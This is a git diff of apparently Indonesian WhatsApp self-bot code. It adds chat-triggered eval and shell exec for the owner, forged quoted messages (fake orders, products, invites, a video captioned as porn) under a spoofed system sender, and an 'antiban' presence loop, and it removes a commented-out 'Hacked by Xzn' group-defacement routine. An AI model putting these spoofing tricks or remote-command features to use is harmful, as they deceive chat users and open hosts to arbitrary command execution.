@@ -82,7 +82,7 @@ baterai = {
     baterai: 0,
     cas: false
 }
-public = true
+public = false
 autorespon = true
 xzntes = '©[XM] XHIRO MHONSHINE √ Xᴢɴ々Bᴏᴛ⸙'
 /*************************************/
@@ -276,66 +276,8 @@ const checkSCommand = (id) => {
 		var pes = (type === 'conversation' && qul.message.conversation) ? qul.message.conversation : (type == 'imageMessage') && qul.message.imageMessage.caption ? qul.message.imageMessage.caption : (type == 'videoMessage') && qul.message.videoMessage.caption ? qul.message.videoMessage.caption : (type == 'extendedTextMessage') && qul.message.extendedTextMessage.text ? qul.message.extendedTextMessage.text : ''
 		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
         const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = udin.user.phone
-        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
-        //send 1 button
-/*const sendButton = async(content, footer, button1, row1, options = {}) => {
-      buttons = [
-        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 }
-      ]
-      buttonMessage = {
-        contentText: content,
-        footerText: footer,
-        buttons: buttons,
-        headerType: 1
-      }
-      await udin.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
-    }*/
-//send 2 button
-/*const send2Button = async(content, footer, button1, row1, button2, row2, options = {}) => {
-      buttons = [
-        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 },
-        { buttonId: row2, buttonText: { displayText: button2 }, type: 1 }
-      ]
-      buttonMessage = {
-        contentText: content,
-        footerText: footer,
-        buttons: buttons,
-        headerType: 1
-      }
-      await udin.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
-    }*/
-//send 3 button
-/*const send3Button = async(content, footer, button1, row1, button2, row2, button3, row3, options = {}) => {
-      buttons = [
-        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 },
-        { buttonId: row2, buttonText: { displayText: button2 }, type: 1 },
-        { buttonId: row3, buttonText: { displayText: button3 }, type: 1 }
-      ]
-      buttonMessage = {
-        contentText: content,
-        footerText: footer,
-        buttons: buttons,
-        headerType: 1
-      }
-      await udin.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
-    }*/
-//send gambar + button
-/*const sendButtonImg = async(content, url, footer, button1, row1, options = {}) => {
-      m = await hexa.prepareMessage(from, await (await fetch(url)).buffer(), MessageType.image)
-      buttons = [
-        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 }
-      ]
-      buttonMessage = {
-        contentText: content,
-        footerText: footer,
-        buttons: buttons,
-        headerType: 4,
-        imageMessage: m.message.imageMessage
-      }
-      await udin.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
-    }*/
+        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')        
 /*****UCAPAN*****/
-
 if(time2 < "23:59:00"){
 var ucapanWaktu = 'Malam Lord'
                                         }
@@ -353,285 +295,157 @@ var ucapanWaktu = 'Siang Lord'
                                          }
 if(time2 < "09:00:00"){
 var ucapanWaktu = 'Pagi Lord'
-                                         }
-                                         
+                                         }                                        
        /*************************************/  
-                                
-        const dinn = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from} : {}) }, message: { orderMessage:{ orderId: '155157279766079', itemCount: '7777777', status: 'INQUIRY', surface:  'CATALOG', message: '{Xᴢɴ々Bᴏᴛ}', orderTitle: 'Its Me Angga', sellerJid: '6282256080304@s.whatsapp.net', token: 'AR5wc3iY2NY8yJaK9MMXdlK/aguUxoA8yPtSFcvt0lrE5g==' }}}
-        
-        const dinnn = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from} : {}) }, message: { orderMessage:{ orderId: '155157279766079', thumbnail: fs.readFileSync('./virus/virgam.jpg'), itemCount: '2021', status: 'INQUIRY', surface:  'CATALOG', message: 'Xᴢɴ々Bᴏᴛ', orderTitle: 'Its Me Angga', sellerJid: '6282256080304@s.whatsapp.net', token: 'AR5wc3iY2NY8yJaK9MMXdlK/aguUxoA8yPtSFcvt0lrE5g==' }}}
-        
-        const flokasi = {
-    key : {
-           participant : '0@s.whatsapp.net'
-                        },
-       message: {
-                    //locationMessage: {
-                    	liveLocationMessage: {
-                    	caption: 'Xᴢɴ々Bᴏᴛ',
-                    name: 'Di Rumah Mertua',
-                          }
-                        }
-                      }
-                      
-         const fdocs = {
-    key : {
-           participant : '0@s.whatsapp.net'
-                        },
-       message: {
-                    documentMessage: {
-                    title: 'Its Me Zainudin Anggara', 
-                          }
-                        }
-                      }
-                      
-            const fvideo = {
-     key: { 
-          fromMe: false,
-          participant: `0@s.whatsapp.net`, ...(from ? 
-     { remoteJid: "6282256080304-1622727181@g.us" } : {}) 
-                },
-     message: { 
-                 "videoMessage": {
-                 "title":"Bokep nganu",
-                 "h": `Hmm`,
-                 'seconds': '99999', 
-                 'caption': 'Bokep Nganu',
-                        }
-                       }
-                      }
-                      
-            const fgclink = {
-    "key": {
-        "fromMe": false,
-        "participant": "0@s.whatsapp.net",
-        "remoteJid": "0@s.whatsapp.net"
-    },
-    "message": {
-        "groupInviteMessage": {
-        	"mimetype": "image/jpeg",
-						"jpegThumbnail": fs.readFileSync(`./media/loli.jpeg`),
-            "groupJid": "6282256080304-1622727181@g.us",
-            "inviteCode": "mememteeeekkeke",
-            "groupName": "Its Me Zainudin Anggara", 
-            "caption": "XZNSENPAI",
-                       }
-                      }
-                     }
-              
-              const fgif = {
-     key: { 
-          fromMe: false,
-          participant: `0@s.whatsapp.net`, ...(from ? 
-     { remoteJid: "6282256080304-1622727181@g.us" } : {}) 
-                },
-     message: { 
-                 "videoMessage": { 
-                 "title":"Its Me Zainudin Anggara",
-                 "h": `Hmm`,
-                 'seconds': '99999', 
-                 'gifPlayback': 'true', 
-                 'caption': 'Its Me Zainudin Anggara',
-                        }
-                       }
-                      } 
-                      
-               const ftextt = {
-     key: { 
-          fromMe: false,
-          participant: `0@s.whatsapp.net`, ...(from ? 
-     { remoteJid: "6282256080304-1622727181@g.us" } : {}) 
-                },
-     message: { 
-        "extendedTextMessage": {
-        	"mimetype": "image/jpeg",
-						"jpegThumbnail": fs.readFileSync(`./media/loli.jpeg`),
-                 "text":"Its Me Zainudin Anggara",
-                 "title": `Hmm`,
-                        }
-                      } 
-                     }
-                     
-const fvn = {
-     key: { 
-          fromMe: false,
-          participant: `0@s.whatsapp.net`, ...(from ? 
-     { remoteJid: "6282256080304-1622727181@g.us" } : {}) 
-                },
-     message: { 
-        "audioMessage": {
-                 "mimetype":"audio/ogg; codecs=opus",
-                 "seconds": "${second}",
-                 "ptt": "true"
-                        }
-                      } 
-                     }
-          
-          const sft = {
-        key: {
-            fromMe: false,
-            participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
-        },
-        message: {
-            "productMessage": {
-                "product": {
-                    "productImage":{  
-                    },
-                    "title": "Creat Its Me Zainudin",
-                    "description": "1 Bulan : Rp 10.000,00",
-                    "currencyCode": "USD",
-                    "priceAmount1000": "10000000000000000000",
-                    "retailerId": "Self Bot",
-                    "productImageCount": 99999
-                },
-                    "businessOwnerJid": `0@s.whatsapp.net`
-                }
-            }
-        }
-        
+const dinn = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from} : {}) }, message: { orderMessage:{ orderId: '155157279766079', itemCount: '7777777', status: 'INQUIRY', surface:  'CATALOG', message: '{Xᴢɴ々Bᴏᴛ}', orderTitle: 'Its Me Angga', sellerJid: '6282256080304@s.whatsapp.net', token: 'AR5wc3iY2NY8yJaK9MMXdlK/aguUxoA8yPtSFcvt0lrE5g==' }}}        
+const dinnn = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from} : {}) }, message: { orderMessage:{ orderId: '155157279766079', thumbnail: fs.readFileSync('./virus/virgam.jpg'), itemCount: '2021', status: 'INQUIRY', surface:  'CATALOG', message: 'Xᴢɴ々Bᴏᴛ', orderTitle: 'Its Me Angga', sellerJid: '6282256080304@s.whatsapp.net', token: 'AR5wc3iY2NY8yJaK9MMXdlK/aguUxoA8yPtSFcvt0lrE5g==' }}}        
+const flokasi = {key : {participant : '0@s.whatsapp.net'}, message: {liveLocationMessage: {caption: 'Xᴢɴ々Bᴏᴛ', name: 'Di Rumah Mertua'}}}                      
+const fdocs = {key : {participant : '0@s.whatsapp.net'}, message: {documentMessage: {title: 'Its Me Zainudin Anggara'}}}
+const fvideo = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6282256080304-1622727181@g.us" } : {})}, message: { "videoMessage": {"title":"Bokep nganu", "h": `Hmm`, 'seconds': '99999', 'caption': 'Bokep Nganu'}}}             
+const fgclink = {"key": {"fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"}, "message": {"groupInviteMessage": {"mimetype": "image/jpeg", "jpegThumbnail": fs.readFileSync(`./media/loli.jpeg`), "groupJid": "6282256080304-1622727181@g.us", "inviteCode": "mememteeeekkeke", "groupName": "Its Me Zainudin Anggara", "caption": "XZNSENPAI"}}}
+const fgif = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6282256080304-1622727181@g.us" } : {})}, message: {"videoMessage": {"title":"Its Me Zainudin Anggara", "h": `Hmm`, 'seconds': '99999', 'gifPlayback': 'true', 'caption': 'Its Me Zainudin Anggara'}}}                       
+const ftextt = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6282256080304-1622727181@g.us" } : {})}, message: {"extendedTextMessage": {"mimetype": "image/jpeg", "jpegThumbnail": fs.readFileSync(`./media/loli.jpeg`), "text":"Its Me Zainudin Anggara", "title": `Hmm`}}}                     
+const fvn = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6282256080304-1622727181@g.us" } : {})}, message: {"audioMessage": {"mimetype":"audio/ogg; codecs=opus", "seconds": "${second}", "ptt": "true"}}}
+const sft = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"productMessage": {"product": {"productImage":{ }, "title": "Creat Its Me Zainudin", "description": "1 Bulan : Rp 10.000,00", "currencyCode": "USD", "priceAmount1000": "10000000000000000000", "retailerId": "Self Bot", "productImageCount": 99999}, "businessOwnerJid": `0@s.whatsapp.net`}}}       
         /*************************************/
-		const totalchat = await udin.chats.all()
-		const groupMetadata = isGroup ? await udin.groupMetadata(from) : ''
-		const groupName = isGroup ? groupMetadata.subject : ''
-		const groupId = isGroup ? groupMetadata.jid : ''
-		const groupMembers = isGroup ? groupMetadata.participants : ''
-		const groupDesc = isGroup ? groupMetadata.desc : ''
-		const groupAdmins = isGroup ? xznsenpai.getGroupAdmins(groupMembers) : ''
-		const groupOwner = isGroup ? groupMetadata.owner : ''
+const totalchat = await udin.chats.all()
+const groupMetadata = isGroup ? await udin.groupMetadata(from) : ''
+const groupName = isGroup ? groupMetadata.subject : ''
+const groupId = isGroup ? groupMetadata.jid : ''
+const groupMembers = isGroup ? groupMetadata.participants : ''
+const groupDesc = isGroup ? groupMetadata.desc : ''
+const groupAdmins = isGroup ? xznsenpai.getGroupAdmins(groupMembers) : ''
+const groupOwner = isGroup ? groupMetadata.owner : ''
 		
-		/*************setelan**************/
-		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
-		const isGroupAdmins = groupAdmins.includes(sender) || false
-		const isWelkom = isGroup ? welkom.includes(from) : false
-		const isAntiLink = isGroup ? antilink.includes(from) : false
-		const isOwner = ownerNumber.includes(sender)
-		const itsMe = qul.key.fromMe ? true : false
-		const isMybot = isOwner || itsMe
-		idttt = [];
-      players1 = [];
-      players2 = [];
-      turn = [];
-      for (let i of roomttt) {
-        idttt.push(i.id)
-        players1.push(i.player1)
-        players2.push(i.player2)
-        turn.push(i.turn)
-      }
-      const isTTT = isGroup ? idttt.includes(from) : false
-	    const isPlayer1 = isGroup ? players1.includes(sender) : false
-      const isPlayer2 = isGroup ? players2.includes(sender) : false 
-		const isUrl = (url) => {
-			return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
-		}
+		/*************SETELAN**************/
+const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
+const isGroupAdmins = groupAdmins.includes(sender) || false
+const isWelkom = isGroup ? welkom.includes(from) : false
+const isAntiLink = isGroup ? antilink.includes(from) : false
+const isOwner = ownerNumber.includes(sender)
+const itsMe = qul.key.fromMe ? true : false
+const isMybot = isOwner || itsMe
+idttt = [];
+players1 = [];
+players2 = [];
+turn = [];
+for (let i of roomttt) {
+idttt.push(i.id)
+players1.push(i.player1)
+players2.push(i.player2)
+turn.push(i.turn)
+}
+const isTTT = isGroup ? idttt.includes(from) : false
+const isPlayer1 = isGroup ? players1.includes(sender) : false
+const isPlayer2 = isGroup ? players2.includes(sender) : false 
+const isUrl = (url) => {
+return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
+}
 		
-			/***************** SCURITY FEATURE ********/
-			const sendStickerFromUrl = async(to, url) => {
-                var names = Date.now() / 10000;
-                var download = function (uri, filename, callback) {
-                    request.head(uri, function (err, res, body) {
-                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
-                    });
-                };
-                download(url, './stik' + names + '.png', async function () {
-                    console.log('selesai');
-                    let filess = './stik' + names + '.png'
-                    let asw = './stik' + names + '.webp'
-                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
-                        let media = fs.readFileSync(asw)
-                        udin.sendMessage(to, media, MessageType.sticker,{quoted:qul})
-                        fs.unlinkSync(filess)
-                        fs.unlinkSync(asw)
-                    });
-                });
-            } 
-            const sendMediaURL = async(to, url, text="", mids=[]) =>{
-                if(mids.length > 0){
-                    text = normalizeMention(to, text, mids)
-                }
-                const fn = Date.now() / 10000;
-                const filename = fn.toString()
-                let mime = ""
-                var download = function (uri, filename, callback) {
-                    request.head(uri, function (err, res, body) {
-                        mime = res.headers['content-type']
-                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
-                    });
-                };
-                download(url, filename, async function () {
-                    console.log('done');
-                    let media = fs.readFileSync(filename)
-                    let type = mime.split("/")[0]+"Message"
-                    if(mime === "image/gif"){
-                        type = MessageType.video
-                        mime = Mimetype.gif
-                    }
-                    if(mime.split("/")[0] === "audio"){
-                        mime = Mimetype.mp4Audio
-                    }
-                    udin.sendMessage(to, media, type, { quoted: qul, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
-                    
-                    fs.unlinkSync(filename)
-                });
-            }   
-			const replyy = (teks) => {
-            udin.sendMessage(from, teks, text, { quoted: qul, thumbnail: fs.readFileSync('./media/loli.jpeg'), contextInfo: { externalAdReply: { title: 'Its_me_xzn', body: 'Xᴢɴ々Bᴏᴛ', sourceUrl: `https://wa.me/6282256080304?text=Assalamualaikum`, thumbnail: fs.readFileSync('./media/loli.jpeg') }}})
+/***************** SCURITY FEATURE ********/
+const sendStickerFromUrl = async(to, url) => {
+var names = Date.now() / 10000;
+var download = function (uri, filename, callback) {
+request.head(uri, function (err, res, body) {
+request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
+});
+};
+download(url, './stik' + names + '.png', async function () {
+console.log('selesai');
+let filess = './stik' + names + '.png'
+let asw = './stik' + names + '.webp'
+exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
+let media = fs.readFileSync(asw)
+udin.sendMessage(to, media, MessageType.sticker,{quoted:qul})
+fs.unlinkSync(filess)
+fs.unlinkSync(asw)
+});
+});
+} 
+const sendMediaURL = async(to, url, text="", mids=[]) =>{
+if(mids.length > 0){
+text = normalizeMention(to, text, mids)
+}
+const fn = Date.now() / 10000;
+const filename = fn.toString()
+let mime = ""
+var download = function (uri, filename, callback) {
+request.head(uri, function (err, res, body) {
+mime = res.headers['content-type']
+request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
+});
+};
+download(url, filename, async function () {
+console.log('done');
+let media = fs.readFileSync(filename)
+let type = mime.split("/")[0]+"Message"
+if(mime === "image/gif"){
+type = MessageType.video
+mime = Mimetype.gif
+}
+if(mime.split("/")[0] === "audio"){
+mime = Mimetype.mp4Audio
+}
+udin.sendMessage(to, media, type, { quoted: qul, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})                    
+fs.unlinkSync(filename)
+});
+}   
+const replyy = (teks) => {
+udin.sendMessage(from, teks, text, { quoted: qul, thumbnail: fs.readFileSync('./media/loli.jpeg'), contextInfo: { externalAdReply: { title: 'Its_me_xzn', body: 'Xᴢɴ々Bᴏᴛ', sourceUrl: `https://wa.me/6282256080304?text=Assalamualaikum`, thumbnail: fs.readFileSync('./media/loli.jpeg') }}})
             }
-            const fyt = (teks) => {
-            udin.sendMessage(from, teks, MessageType.text, {quoted:qul, contextInfo:{"externalAdReply":{"title": fake, mediaType: 2, thumbnail: fs.readFileSync('./media/loli.jpeg'), "previewType": "VIDEO","mediaUrl": `https://youtu.be/5odMRQDrhoI`}}})
+const fyt = (teks) => {
+udin.sendMessage(from, teks, MessageType.text, {quoted:qul, contextInfo:{"externalAdReply":{"title": fake, mediaType: 2, thumbnail: fs.readFileSync('./media/loli.jpeg'), "previewType": "VIDEO","mediaUrl": `https://youtu.be/5odMRQDrhoI`}}})
             }
-            const fyt2 = (teks) => {
-            udin.sendMessage(from, teks, MessageType.text, {quoted:qul, contextInfo: { forwardingScore: 250, isForwarded: true, "externalAdReply":{"title": `${ucapanWaktu} ${pushname}`, mediaType: 2, thumbnail: fs.readFileSync('./media/loli.jpeg'), "previewType": "VIDEO","mediaUrl": `https://youtu.be/5odMRQDrhoI`}}})
+const fyt2 = (teks) => {
+udin.sendMessage(from, teks, MessageType.text, {quoted:qul, contextInfo: { forwardingScore: 250, isForwarded: true, "externalAdReply":{"title": `${ucapanWaktu} ${pushname}`, mediaType: 2, thumbnail: fs.readFileSync('./media/loli.jpeg'), "previewType": "VIDEO","mediaUrl": `https://youtu.be/5odMRQDrhoI`}}})
+           }
+const fakethumb = (teks, yes) => {
+udin.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./media/loli.jpeg'),quoted:qul,caption:yes})
             }
-            const fakethumb = (teks, yes) => {
-            udin.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./media/loli.jpeg'),quoted:qul,caption:yes})
-            }
-            const reply = (teks) => {
-			udin.sendMessage(from, teks, text, {quoted:qul})
+const reply = (teks) => {
+udin.sendMessage(from, teks, text, {quoted:qul})
 			}
-			const mentions = (teks, memberr, id) => {
-			(id == null || id == undefined || id == false) ? udin.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : udin.sendMessage(from, teks.trim(), extendedText, {quoted: flokasi, contextInfo: {"mentionedJid": memberr}})
+const mentions = (teks, memberr, id) => {
+(id == null || id == undefined || id == false) ? udin.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : udin.sendMessage(from, teks.trim(), extendedText, {quoted: flokasi, contextInfo: {"mentionedJid": memberr}})
 			} 
-			const sendMess = (hehe, teks) => {
-		    udin.sendMessage(hehe, teks, text)
+const sendMess = (hehe, teks) => {
+udin.sendMessage(hehe, teks, text)
 			}
 			/*****************END SCURITY FEATURE ********/
-			
-			if (messagesC.includes("://chat.whatsapp.com/")){
-					if (!isGroup) return
-					if (!isAntiLink) return
-					if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
-					udin.updatePresence(from, Presence.composing)
-					if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
-					var kic = `${sender.split("@")[0]}@s.whatsapp.net`
-						reply(`Link Group Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 5detik lagi`)
-						setTimeout( () => {
-						udin.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
-					}, 5000)
-						setTimeout( () => {
-						udin.updatePresence(from, Presence.composing)
-						reply("1detik")
-					}, 4000)
-						setTimeout( () => {
-						udin.updatePresence(from, Presence.composing)
-						reply("2detik")
-					}, 3000)
-						setTimeout( () => {
-						udin.updatePresence(from, Presence.composing)
-						reply("3detik")
-					}, 2000)
-						setTimeout( () => {
-						udin.updatePresence(from, Presence.composing)
-						reply("4detik")
-					}, 1000)
-						setTimeout( () => {
-						udin.updatePresence(from, Presence.composing)
-						reply("5detik")
-					}, 0)
-				}
-				
-				if (!isGroup && !isCmd && !command && !qul.key.fromMe && !autorespon) {
-//numd = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
-//simi = await fetchJson(`https://api.simsimi.net/v1/?lang=${numd.data.country_code}&cf=false&text=${arg}`)
+if (messagesC.includes("://chat.whatsapp.com/")){
+if (!isGroup) return
+if (!isAntiLink) return
+if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
+udin.updatePresence(from, Presence.composing)
+if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
+var kic = `${sender.split("@")[0]}@s.whatsapp.net`
+reply(`Link Group Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 5detik lagi`)
+setTimeout( () => {
+udin.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+}, 5000)
+setTimeout( () => {
+udin.updatePresence(from, Presence.composing)
+reply("1detik")
+}, 4000)
+setTimeout( () => {
+udin.updatePresence(from, Presence.composing)
+reply("2detik")
+}, 3000)
+setTimeout( () => {
+udin.updatePresence(from, Presence.composing)
+reply("3detik")
+}, 2000)
+setTimeout( () => {
+udin.updatePresence(from, Presence.composing)
+reply("4detik")
+}, 1000)
+setTimeout( () => {
+udin.updatePresence(from, Presence.composing)
+reply("5detik")
+}, 0)
+}
+
+if (!isGroup && !isCmd && !command && !qul.key.fromMe && !autorespon) {
 simi = await fetchJson(`https://api.simsimi.net/v1/?lang=id&cf=false&text=${arg}`)
 sami = simi.success
 udin.sendMessage(from, `_${sami}_`, text, {quoted:qul})
@@ -674,98 +488,74 @@ if (budy.includes('Makasih')) {
 const gojomp3 = fs.readFileSync('./assets/gojo.mp3');
 udin.sendMessage(from, gojomp3, MessageType.audio, {quoted: qul, mimetype: 'audio/mp4', ptt:true})
 }
-		//self mode
-		/*if (budy.startsWith('_>/<')){
-if (!isBotGroupAdmins) return
-if (!isGroup) return
-anu = fs.readFileSync('./media/xznsenpai.jpeg')
-udin.updateProfilePicture(from, anu)
-udin.groupUpdateSubject(from, `Hacked by Xzn`)
-udin.groupUpdateDescription(from, `Mampos Gw Kudet`)
-udin.groupSettingChange(from, GroupSettingChange.messageSend, true)
-setTimeout(() => {
-reply('Kasihan Kena Hack')
-}, 8000)
-}*/
-		//if (itsMe){
-		if (isMybot){
+
+
+//INI MODE SELF NYA BAMBANG
+//if (itsMe){
+if (isMybot){
 if (chats.startsWith('>')){
-				console.log(color('[EVAL]'), color(moment(qul.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V2 brooo`))
-				try{
+if (args.length == 0) return reply('LU NYURUH APA')
+console.log(color('[EVAL]'), color(moment(qul.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V2 brooo`))
+try{
 //reply(require('util').format(await eval(`;(async () => { ${chats.slice(2)} })()`)))
 return udin.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),MessageType.text, {quoted: qul})
 }catch(err){
 e = String(err)
-reply(e)
-}
-}
+reply(e)}}
 if (chats.startsWith('$')){
-		    if (!arg) return
-				exec(arg, (err, stdout) => {
-					if (err) return xznsenpai.reply(from, err, qul)
-					if (stdout) xznsenpai.reply(from, stdout, qul)
-				})
-				}
-           if (chats.toLowerCase() === `${prefix}public`){
-                 public = true
-				//xznsenpai.sendFakeStatus(from, `Sukses`, `Status: PUBLIC`)
-				reply("Mode Public Ngen")
-			}
-			if (chats.toLowerCase() === `${prefix}self`){
-				public = false
-				//xznsenpai.sendFakeStatus(from, `Sukses`, `Status: SELF`)
-				reply("Mode Self Ngen")
-			}
-			if (chats.startsWith('z')){
-				console.log(color('[EVAL]'), color(moment(qul.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval brooo`))
-				try{
-				reply(require('util').format(await eval(`;(async () => { ${chats.slice(2)} })()`)))
-				//return xznsenpai.reply(from, JSON.stringify(eval(chats.slice(2)), null, 2), qul)
-				}catch(err){
+if (!arg) return
+exec(arg, (err, stdout) => {
+if (err) return xznsenpai.reply(from, err, qul)
+if (stdout) xznsenpai.reply(from, stdout, qul)})}
+if (chats.toLowerCase() === `${prefix}public`){
+public = true
+//xznsenpai.sendFakeStatus(from, `Sukses`, `Status: PUBLIC`)
+reply("Mode Public Ngen")}
+if (chats.toLowerCase() === `${prefix}self`){
+public = false
+//xznsenpai.sendFakeStatus(from, `Sukses`, `Status: SELF`)
+reply("Mode Self Ngen")}
+if (chats.startsWith('z')){
+console.log(color('[EVAL]'), color(moment(qul.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval brooo`))
+try{
+reply(require('util').format(await eval(`;(async () => { ${chats.slice(2)} })()`)))
+//return xznsenpai.reply(from, JSON.stringify(eval(chats.slice(2)), null, 2), qul)
+}catch(err){
 e = String(err)
-reply(e)
-}}}
-			
-			
-		if (!isCmd && qul.message) {
-             for (let i of totalchat) {
-          udin.updatePresence(i.jid, Presence.recording) //unavailable, available, composing, recording, paused
-                   }
-             }
-		//auto read
-	         await udin.chatRead(from, "read")
-	//run
-        
-		if (!public){
-			if (!qul.key.fromMe) return
-		}
-		
-	       //if (isCmd && !isGroup) {console.log(color('[UDIN]' ,'blue'), color(moment(qul.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`))}
-           //if (isCmd && isGroup) {console.log(color('[UDIN]'), color(moment(qul.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(udin.user.name), 'in', color(groupName))}
+reply(e)}}
+}//end
+//START FUCTION ANTIBAN
+if (!isCmd && qul.message) {
+for (let i of totalchat) {
+await udin.updatePresence(i.jid, Presence.recording)}} //unavailable, available, composing, recording, paused
+await udin.chatRead(from, "read")
+//END FUCTION ANTIBAN        
+//START PUBLIC
+if (!public){
+if (!qul.key.fromMe) return
+}
+ //if (isCmd && !isGroup) {console.log(color('[UDIN]' ,'blue'), color(moment(qul.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`))}
+//if (isCmd && isGroup) {console.log(color('[UDIN]'), color(moment(qul.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(udin.user.name), 'in', color(groupName))}
+if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
+//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
+if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
+//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))*/
            
-           //private chat message
-			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
-			//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
-			
-			//group message
-			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
-			//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))*/
-           
-           //anu
-           switch(buttonCmd) {
-	      case 'ah':
-          reply(mess.wait)
-          res = await fs.readFileSync('./assets/ah.mp3');
-          udin.sendMessage(from, res, audio, {quoted : qul, mimetype: 'audio/mp4',duration:999.999, ptt:true})
-          break
-          case 'iri':
-          reply(mess.wait)
-          const irimp3 = fs.readFileSync('./assets/iri.mp3');
-          udin.sendMessage(from, irimp3, MessageType.audio, {quoted: qul, mimetype: 'audio/mp4', duration: 99999999, ptt:true})
-          break
+//START BUTTONCmd
+switch(buttonCmd) {
+case 'ah':
+reply(mess.wait)
+ res = await fs.readFileSync('./assets/ah.mp3');
